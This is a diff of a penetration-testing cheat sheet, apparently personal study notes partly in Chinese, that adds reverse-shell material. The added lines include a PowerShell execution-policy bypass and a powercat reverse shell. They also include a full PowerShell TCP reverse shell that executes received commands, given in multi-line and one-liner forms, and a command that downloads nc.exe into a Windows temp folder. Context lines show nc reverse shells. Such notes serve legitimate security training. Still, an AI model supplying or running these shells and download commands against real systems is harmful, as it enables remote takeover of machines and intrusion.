@@ -36,6 +36,8 @@ ss -aptu
 
 ### cmd & powershell
 
+powershell -ep bypass
+
 #### systeminfo
 
 ```shell
@@ -133,9 +135,11 @@ sc start wsearch
 
 ---
 
-## Tools
+## Tools (reverse shell)
 
 ### nc
+
+全场景，全平台，网络工具和实用程序的网络瑞士军刀。
 
 ```shell
 nc 升级shell
@@ -147,35 +151,40 @@ nc 172.16.8.1 1234 -e /bin/bash
 nc 172.16.8.1 1234 | /bin/bash | nc 72.16.8.1 2345
 ```
 
-## Information Gathering
-
-<https://www.megacorpone.com/>
-
-### whois
+### powercat
 
 ```shell
-╰─❯ whois megacorpone.com
+powercat -c 172.16.8.1 -p 1234 -e cmd.exe
 ```
 
-### host
+### powershell
 
-```shell
-╰─❯ host NS1.MEGACORPONE.COM
-NS1.MEGACORPONE.COM has address 51.79.37.18
+reverse shell
+
+```powershell
+# 被控端
+$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte,0,$sendbyte.Length);
+  $stream.Flush();
+}
+$client.Close();
+
+# 单行行式的代码
+C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-### google hacking
+download file
 
-<https://www.exploit-db.com/google-hacking-database>
+```powershell
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://kali/binaries/nc.exe','c:\windows\temp\nc.exe')"
+```
 
----
-
-## OWASP 10
-
-### 文件包含
-
-<https://www.php.net/manual/zh/wrappers.php>
-
-## Tips
-
-1.
+### wiresahrk
